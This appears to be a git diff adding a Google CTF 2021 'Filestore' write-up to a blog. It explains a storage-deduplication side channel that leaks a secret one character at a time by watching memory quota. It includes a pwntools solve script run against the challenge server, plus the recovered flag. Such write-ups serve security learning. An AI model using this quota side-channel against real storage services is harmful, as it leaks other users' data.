@@ -24,7 +24,7 @@ Below are the writeups :
 | ------------- |  ------- | --- | ---: |
 |[Story](#story) | Crypto | 249 | 32 | 
 |[Pythia](#pythia) | Crypto | 173 | 65 |
-|[Filestore](#scrambled-elgs) | Misc | 50 | 321 |
+|[Filestore](#filestore) | Misc | 50 | 321 |
 
 <br/>
 
@@ -657,7 +657,7 @@ We were the <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/mas
 
 ## Filestore
 
-![Google CTF 021 Writeup](/assets/img/ctfImages/google2021/img6.png)
+![Google CTF 021 Writeup](/assets/img/ctfImages/google2021/img11.png)
 
 The server source code provided :
 
@@ -768,6 +768,59 @@ except Exception:
 time.sleep(1)
 
 ```
- 
 
+This challenge involved understanding the storage mechanism shown here. The first choice 'load' would print the contents of a file given the file ID. The second option stores the provided data. The server stores it in a rather peculiar way by using data deduplication. For example, if the existing storage comprised of "flag, hello there, ....." and if you added the word "hello", it would still look like "flag, hello there, ....." as the word 'hello' is repeated in the original data structure. This process of removing duplicates saves a lot of space but has some vulnerabilities. The index or position of the stored string is tracked by the
+`files` dictionary. The third option 'status' prints the amount of memory currently occupied (if there is a duplication, there is no change).
+
+Suppose currently the strings stored were "CTF{this_is_a_test_flag}". If I made a loop which added all printable ASCII characters after "CTF{" and then checked for the status or memory occupied, the string which causes no change in memory (i.e. "CTF{t") would be a character of the flag. This is how we solved it, by checking which character caused no change in memory size and slowly leaking the flag, character by character.
+
+The solve script :
+
+```python
+
+from pwn import *
+
+local = False
+debug = False
+
+if local:
+    r = process(["python3", "filestore/filestore.py"], level='debug') if debug else process(["python3", "filestore/filestore.py"])
+else:
+    r = remote("filestore.2021.ctfcompetition.com", 1337, level = 'debug') if debug else remote("filestore.2021.ctfcompetition.com", 1337)
+
+
+possible_chars = [chr(i) for i in range(33, 127)]
+FLAG = "CTF{"
+r.recvuntil(b"- exit\n")
+
+for _ in range(30):
+    try:
+        for char in possible_chars:
+            r.sendline(b"status")
+            r.recvuntil(b"Quota: ")
+            current_quota = r.recvline(keepends=False)
+            r.sendline(b"store")
+            r.sendline(FLAG[-15:] + char)
+            r.sendline(b"status")
+            r.recvuntil(b"Quota: ")
+            new_quota = r.recvline(keepends=False)
+            if new_quota == current_quota:
+                FLAG += char
+                print(FLAG)
+                break
+    except EOFError:
+        if local:
+            r = process(["python3", "filestore.py"], level='debug') if debug else process(["python3", "filestore.py"])
+        else:
+            r = remote("filestore.2021.ctfcompetition.com", 1337, level = 'debug') if debug else remote("filestore.2021.ctfcompetition.com", 1337)
+           
+```
+
+After running the script, we got the flag :
+
+![Google CTF 021 Writeup](/assets/img/ctfImages/google2021/img12.png)
+
+<p> <b>Flag :</b> CTF{CR1M3_0f_d3dup1ic4ti0n} </p>
+
+<br/>
 
